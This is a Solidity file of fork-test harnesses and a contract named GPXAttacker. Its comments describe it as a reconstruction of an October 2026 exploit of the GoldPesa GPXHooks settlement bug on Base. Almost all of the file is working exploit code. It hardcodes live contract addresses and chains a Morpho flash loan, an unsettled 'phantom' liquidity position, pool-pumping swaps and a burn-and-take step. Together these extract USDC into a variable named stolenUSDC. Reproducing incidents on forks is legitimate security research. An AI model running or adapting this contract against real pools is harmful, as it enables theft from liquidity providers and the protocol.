// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// Fork harnesses for the GoldPesa GPXHooks shared-unlock settlement bug (Base).
//  - SwapHarness: minimal PoolManager unlocker to push arbitrary swaps through the GPX pool.
//  - GPXAttacker: reconstruction of the 2026-10-02 attacker flow (0x3d69591a...4e86), parameterized.

import {TickMath} from "v4-core-min/libraries/TickMath.sol";
import {LiquidityAmounts} from "v4-core-min/libraries/LiquidityAmounts.sol";

interface IERC20A {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPoolManagerA {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey5 calldata key, SwapParams calldata params, bytes calldata hookData)
        external
        returns (int256 delta);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
    function extsload(bytes32 slot) external view returns (bytes32);
}

interface IPOSMA {
    function modifyLiquidities(bytes calldata unlockData, uint256 deadline) external payable;
    function modifyLiquiditiesWithoutUnlock(bytes calldata actions, bytes[] calldata params) external payable;
    function nextTokenId() external view returns (uint256);
}

interface IMorphoA {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

struct PoolKey5 {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

contract SwapHarness {
    IPoolManagerA public constant PM = IPoolManagerA(0x498581fF718922c3f8e6A244956aF099B2652b2b);
    address public constant GPX = 0x454F8c3f1FC79a98363DB6104A20AC59A02A3133;
    address public constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address public constant HOOK = 0x4519e2b040ff1B64fa03aBe2AeF0BC99D7CcEaA8;
    uint160 public constant MIN_SQRT = 4295128739;
    uint160 public constant MAX_SQRT = 1461446703485210103287273052203988822378723970342;

    PoolKey5 public gpxKey = PoolKey5({currency0: GPX, currency1: USDC, fee: 0, tickSpacing: 1, hooks: HOOK});
    uint256 public lastAmountIn;

    function doSwap(bool zeroForOne, uint256 amountIn) external {
        PM.unlock(abi.encode(zeroForOne, amountIn));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(PM), "only pm");
        (bool zeroForOne, uint256 amountIn) = abi.decode(data, (bool, uint256));
        int256 d = PM.swap(
            gpxKey,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn),
                sqrtPriceLimitX96: zeroForOne ? MIN_SQRT + 1 : MAX_SQRT - 1
            }),
            ""
        );
        int128 a0 = int128(d >> 128);
        int128 a1 = int128(d);
        _resolve(GPX, a0);
        _resolve(USDC, a1);
        lastAmountIn = amountIn;
        return "";
    }

    function _resolve(address currency, int128 amount) internal {
        if (amount < 0) {
            PM.sync(currency);
            IERC20A(currency).transfer(address(PM), uint256(uint128(-amount)));
            PM.settle();
        } else if (amount > 0) {
            PM.take(currency, address(this), uint256(uint128(amount)));
        }
    }

    receive() external payable {}
}

contract GPXAttacker {
    IPoolManagerA public constant PM = IPoolManagerA(0x498581fF718922c3f8e6A244956aF099B2652b2b);
    IPOSMA public constant POSM = IPOSMA(0x7C5f5A4bBd8fD63184577525326123B519429bDc);
    IMorphoA public constant MORPHO = IMorphoA(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    address public constant GPX = 0x454F8c3f1FC79a98363DB6104A20AC59A02A3133;
    address public constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address public constant WETH = 0x4200000000000000000000000000000000000006;
    address public constant HOOK = 0x4519e2b040ff1B64fa03aBe2AeF0BC99D7CcEaA8;

    uint8 constant MINT_POSITION = 0x02;
    uint8 constant BURN_POSITION = 0x03;
    uint8 constant TAKE_PAIR = 0x11;

    uint160 constant MIN_SQRT = 4295128739;
    uint160 constant MAX_SQRT = 1461446703485210103287273052203988822378723970342;

    PoolKey5 public gpxKey = PoolKey5({currency0: GPX, currency1: USDC, fee: 0, tickSpacing: 1, hooks: HOOK});
    PoolKey5 public wethKey = PoolKey5({currency0: WETH, currency1: USDC, fee: 500, tickSpacing: 10, hooks: address(0)});

    uint256 public phantomTokenId;
    uint256 public stolenUSDC;
    uint256 public netUSDC;

    function attack(uint256 debtUSDC, uint256 pumpUSDC, uint256 loanUSDC) external {
        MORPHO.flashLoan(USDC, loanUSDC, abi.encode(debtUSDC, pumpUSDC));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == address(MORPHO), "only morpho");
        PM.unlock(data);
        IERC20A(USDC).approve(address(MORPHO), assets);
        netUSDC = IERC20A(USDC).balanceOf(address(this));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(PM), "only pm");
        (uint256 debtUSDC, uint256 pumpUSDC) = abi.decode(data, (uint256, uint256));

        // Step 1: unsettled pure-USDC WETH/USDC position -> phantom debt on the shared PositionManager.
        _mintPhantom(debtUSDC);

        // Step 2-3: GPX-pool buys; the hourly rebalance (if checkRebalance passes) fires inside beforeSwap.
        _swap(gpxKey, false, pumpUSDC);
        _swap(gpxKey, false, pumpUSDC);

        // Step 4: burn own position + TAKE_PAIR -> extracts D only if the hook's burn credit cancelled the debt.
        uint256 before = IERC20A(USDC).balanceOf(address(this));
        _burnOwnAndTake();
        stolenUSDC = IERC20A(USDC).balanceOf(address(this)) - before;

        // Step 5: unwind GPX back to USDC.
        uint256 gb = IERC20A(GPX).balanceOf(address(this));
        if (gb > 0) _swap(gpxKey, true, gb);

        return "";
    }

    function _mintPhantom(uint256 debtUSDC) internal {
        // Read WETH/USDC spot tick; place a 10-tick range 60k ticks below spot -> pure currency1 (USDC).
        bytes32 pid = keccak256(abi.encode(wethKey));
        bytes32 base = keccak256(abi.encode(pid, uint256(6)));
        bytes32 s0 = PM.extsload(base);
        int24 spotTick = int24(uint24(uint256(s0) >> 160));
        int24 lower = ((spotTick - 60000) / 10) * 10;
        int24 upper = lower + 10;

        uint160 spLo = TickMath.getSqrtPriceAtTick(lower);
        uint160 spHi = TickMath.getSqrtPriceAtTick(upper);
        uint128 liq = LiquidityAmounts.getLiquidityForAmount1(spLo, spHi, debtUSDC);

        bytes memory actions = abi.encodePacked(MINT_POSITION);
        bytes[] memory params = new bytes[](1);
        params[0] = abi.encode(wethKey, lower, upper, uint256(liq), type(uint128).max, type(uint128).max, address(this), bytes(""));
        POSM.modifyLiquiditiesWithoutUnlock(actions, params);
        phantomTokenId = POSM.nextTokenId() - 1;
    }

    function _burnOwnAndTake() internal {
        bytes memory actions = abi.encodePacked(BURN_POSITION, TAKE_PAIR);
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(phantomTokenId, uint128(0), uint128(0), bytes(""));
        params[1] = abi.encode(WETH, USDC, address(this));
        POSM.modifyLiquiditiesWithoutUnlock(actions, params);
    }

    function _swap(PoolKey5 memory key, bool zeroForOne, uint256 amountIn) internal {
        int256 d = PM.swap(
            key,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn),
                sqrtPriceLimitX96: zeroForOne ? MIN_SQRT + 1 : MAX_SQRT - 1
            }),
            ""
        );
        int128 a0 = int128(d >> 128);
        int128 a1 = int128(d);
        _resolve(key.currency0, a0);
        _resolve(key.currency1, a1);
    }

    function _resolve(address currency, int128 amount) internal {
        if (amount < 0) {
            PM.sync(currency);
            IERC20A(currency).transfer(address(PM), uint256(uint128(-amount)));
            PM.settle();
        } else if (amount > 0) {
            PM.take(currency, address(this), uint256(uint128(amount)));
        }
    }

    receive() external payable {}
}
